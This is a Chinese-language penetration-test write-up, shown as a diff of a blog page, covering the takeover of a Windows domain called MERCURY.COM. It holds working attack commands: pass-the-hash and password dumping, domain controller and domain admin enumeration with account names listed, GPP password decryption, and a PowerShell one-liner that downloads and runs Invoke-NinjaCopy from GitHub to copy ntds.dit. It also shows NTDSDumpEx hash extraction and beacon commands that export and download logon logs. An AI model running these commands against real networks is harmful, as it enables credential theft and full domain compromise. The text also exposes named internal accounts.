+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.58.1 # 成功</span><br><span class="line">192.168.58.18 # 成功</span><br><span class="line">....</span><br><span class="line">192.168.58.3 # 失败</span><br><span class="line">192.168.58.7 # 失败</span><br><span class="line">....</span><br><span class="line">192.168.58.68 # 成功</span><br><span class="line">192.168.58.21 # 成功</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116" alt=""></p>
+<p>这个过程就是不断的进行<code>hash注入</code>，不断的<code>dump密码</code>，结果就如上图。看<code>Credentials</code>里是否存在域管用户账密。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f" alt=""></p>
+<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">从58.18的机子上发现存在域： </span><br><span class="line"></span><br><span class="line">所属域 --&gt;MERCURY.COM  近1400个域用户...</span><br><span class="line"></span><br><span class="line">nltest /dclist:MERCURY.COM #查看域控 （2个)</span><br><span class="line"></span><br><span class="line">pdc.mercury.com [PDC]  --&gt; 主dc --&gt; 192.168.58.2</span><br><span class="line">BDC.mercury.com        --&gt; 备dc --&gt; 192.168.58.1</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员 （9个)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">Administrator            chenfeng                 chudonggen               </span><br><span class="line">dongzhiwei               IT                       lifen                    </span><br><span class="line">qiaopeng                 weiwei                   zhangxuejun </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">BDC$                     PDC$</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f" alt=""></p>
+<p>然而发现我已经获取到了dc的账号密码。并在<code>CS</code>上上线了，这就意味的此时的域已经沦陷。</p>
+<p>同时通过GPP组策略漏洞成功解密出administraor密码：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b" alt=""><br><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9" alt=""></p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li>vssadmin 无法提取出ntds.dit、在系统中卡死</li>
+<li>ntdsutil 被破坏、无法运行</li>
+<li>存在杀软，mimikatz 无法执行</li>
+</ul>
+<h2 id="突破方法："><a href="#突破方法：" class="headerlink" title="突破方法："></a>突破方法：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1&apos;); Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\dongzhiwei\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure>
+<p>这里用powerSploit框架中的Invoke-NinjaCopy,远程复制文件，成功提取到ntds.dit / system.hive</p>
+<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>参考链接：<a href="https://github.com/zcgonvh/NTDSDumpEx" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0" alt=""></p>
+<p>之前给自己挖了个坑，关于任何去获取域用户的登录IP，除了nmap外，可以ping域用户名，然而这是一个非常错误的认知，这种前提是机器名和用户名相同，这种情况少之又少。</p>
+<p>参考klion牛的方法：</p>
+<p>从目标主控中导出成功登录日志,来定位指定目标机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell hostname</span><br><span class="line">beacon&gt; shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:&quot;*[EventData[Data[@Name=&apos;LogonType&apos;]=&apos;3&apos;] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot;</span><br><span class="line">beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot;</span><br><span class="line">beacon&gt; shell dir c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; download c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; downloads</span><br></pre></td></tr></table></figure>
+<p>利用 <code>Log Parser</code> 日志分析工具,从log中匹配：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&apos;|&apos;)) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&apos;|&apos;)) as IP FROM c:\risalogs.evtx&quot; &gt; C:\log.txt</span><br><span class="line"></span><br><span class="line">进行去重、替换：</span><br><span class="line"></span><br><span class="line">grep -v &apos;\$&apos; log.txt | sort | uniq | egrep -v &apos;ANONYMOUS LOGON|-|:&apos; &gt; login_succeed.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f" alt=""></p>
+<h1 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h1><p>​    从内网中获取了大量主机权限，VPN、核心代码，数据库等，逐进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
     </div>
 </div>
 
     </div>
+</div>
 
 
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
+        
 
-<!-- scripts list from theme config.yml -->
+        
 
-<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
 
-<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
-
-<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
-
-<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/c1y2m3.github.io/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
